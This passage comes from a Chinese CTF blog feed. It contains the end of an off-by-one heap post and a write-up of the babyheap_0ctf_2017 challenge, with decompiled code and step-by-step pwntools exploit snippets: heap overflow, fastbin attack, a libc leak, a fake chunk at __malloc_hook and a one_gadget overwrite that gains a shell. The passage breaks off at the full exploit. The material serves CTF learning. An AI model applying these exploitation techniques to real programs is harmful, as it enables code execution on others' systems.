comment">#0xb看下面补充算法</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">#onegadget覆盖realloc，realloc覆盖malloc</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token string">'0x10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补充：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/4.png"><br>再扣去头部0x10就是0xb<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/5.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_babyheap_0ctf_2017</title>
      <link href="/2023/01/27/buuctf-babyheap-0ctf-2017/"/>
      <url>/2023/01/27/buuctf-babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-buuctf-babyheap-0ctf-2017"><a href="#0x01-buuctf-babyheap-0ctf-2017" class="headerlink" title="0x01 buuctf_babyheap_0ctf_2017"></a>0x01 buuctf_babyheap_0ctf_2017</h1><hr><p>牢骚：第一次做堆题，改exp改了特别长时间，结合别的师傅的wp才做出来的，心累……写篇博客当做里程碑。<br>如果对基础知识不太懂的看看这篇博客，这里不作过多赘述：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">知识补充</a><br>综合网上师傅和<strong>学长大大</strong>的wp，本题提供两种做法</p><hr><p>本题涉及到几个知识点：</p><ul><li>堆溢出</li><li>fastbin attack</li><li>double free</li><li>堆泄露libc地址</li><li>pwndbg如何快速找到fake chunk</li><li>__malloc_hook函数的利用</li><li>堆块重叠<br>环境：Ubuntu16.04</li></ul><hr><h2 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h2><h4 id="0x01-malloc-hook函数攻击原理："><a href="#0x01-malloc-hook函数攻击原理：" class="headerlink" title="0x01 __malloc_hook函数攻击原理："></a>0x01 __malloc_hook函数攻击原理：</h4><hr><ul><li>像malloc、free、realloc这类函数在执行前会先检查对应的hook函数，如果hook函数为空，则继续执行对应的函数，如果不为空，则跳转到hook中的值对应的地址位置执行。（例如hook函数中如果存的是one_gatget的地址则执行one_gatget）</li></ul><hr><h4 id="unsortbin-泄露libc地址"><a href="#unsortbin-泄露libc地址" class="headerlink" title="unsortbin 泄露libc地址"></a>unsortbin 泄露libc地址</h4><ul><li>对于libc-2.23.so而言，当unsortedbin中只有一个freed chunk时，这个freed chunk的fd和bk指针都指向libc中的一个地址（一般是&lt;main_arena+88&gt;），这个偏移也可以算出是0x3c4b78。（小版本是0x3c3b78）而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，<strong>能否读出fd 或者 bk的值</strong>。</li></ul><hr><h2 id="0x02-解题思路："><a href="#0x02-解题思路：" class="headerlink" title="0x02 解题思路："></a>0x02 解题思路：</h2><h3 id="0x02（1）-代码审计："><a href="#0x02（1）-代码审计：" class="headerlink" title="0x02（1） 代码审计："></a>0x02（1） 代码审计：</h3><hr><p>堆题的保护机制一般是全开的，如下：<br><img src="/images/buuctf-babyheap-0ctf-2017/1.png"><br>拖进ida：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">sub_B70</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1LL</span><span class="token operator">:</span>        <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2LL</span><span class="token operator">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3LL</span><span class="token operator">:</span>        <span class="token function">free_0</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4LL</span><span class="token operator">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5LL</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>allocate</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sub_D48</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v2 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">4096</span> <span class="token punctuation">)</span>          v2 <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>        v3 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate Index %d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>edit</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">edit</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_11B2</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v1 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>free</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">free_0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>show</strong></em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_1051</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_130F</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_14F1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题有个地方比较难看懂是什么意思，这里相当于一个结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      #<span class="token number">1</span>表示chunk已创建并且有效，后面都会检查<span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span> #记录chunk的大小<span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>#记录chunk的申请存储地址                                     #只要free掉三个就会清零，实现用户无法访问chunk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于本题有保护机制free后无法访问，首先我们的目的是让一处的chunk可以在free掉后还能被访问（这里用到double free），如下操作：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk0 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk1 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk2 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#chunk3 fastbin</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment">#chunk4 smallbin</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先申请几个堆块，free掉两个fastbin，因为fastbin是单向链表并且服从FILO，<strong>所以第二个free掉的堆块fd指针会指向第一个free的堆块</strong><br>该题不太一样的是先allocate申请大小然后再edit填充内容，其他题目很多都是add直接分配chunk直接填充内容，这里就有一个溢出因为chunk大小由我们规定，输入多少也由我们规定<strong>可以实现无限溢出</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在chunk0处输入，把 chunk 2 的fd指针覆盖为 chunk 4 的地址，只用修改低8字节即可，这样chunk2就从指向chunk1变为指向chunk4，且chunk4相当于处于“’free状态”可再次被申请，这时就有两个指针指向了同一个chunk</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们等下要 malloc 拿到 chunk 4 ，可是 malloc fastbin 有检查， chunksize 必须与相应的 fastbin_index 匹配，所以我们覆盖 chunk 4 的 size 为 fastbin 大小来通过检查，申请两次可以拿到chunk4<br>因为本题allocate的分配机制是从头开始检查哪个chunk是free状态，如果是就把它占用，所以重新分配的chunk分别给了chunk1，而chunk4给了chunk2，相当于两个堆块用的同一个空间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要的是它作为smallbin时的身份于是恢复其size大小，申请回来再释放掉**(释放时，是当做small bin释放的)<strong>此时chunk4的fd指针就会指向libc的main_arena某处，但是我们无法用show来查看chunk4，不过刚刚做的努力就体现在这，</strong>因为chunk2也使用chunk4的空间**，我们就可以通过show chunk2的内容看到chunk4的fd指针内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收\x7f在内的向左六个字节，用\x00补齐八个字节</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>算libc地址如上：<br><img src="/images/buuctf-babyheap-0ctf-2017/2.png"><br>用pwndbg快速找到在__malloc_hook旁边符合条件的fake_chunk指令如上：<br><img src="/images/buuctf-babyheap-0ctf-2017/3.png"><br>用pwndbg找到libc地址和__malloc_hook的地址用于计算偏移：<br><img src="/images/buuctf-babyheap-0ctf-2017/4.png"><br>用pwndbg算偏移如上：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次申请一个chunk被分配到chunk4的位置，将其free掉，用chunk2来修改chunk4的fd为fake_chunk的地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#chunk5</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#chunk6</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token comment">#one_gadget</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请两个chunk，chunk6拿到fake_chunk,并且对chunk6进行输入覆盖__mallo_hook,再次申请就相当于执行one_gadget<br>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code 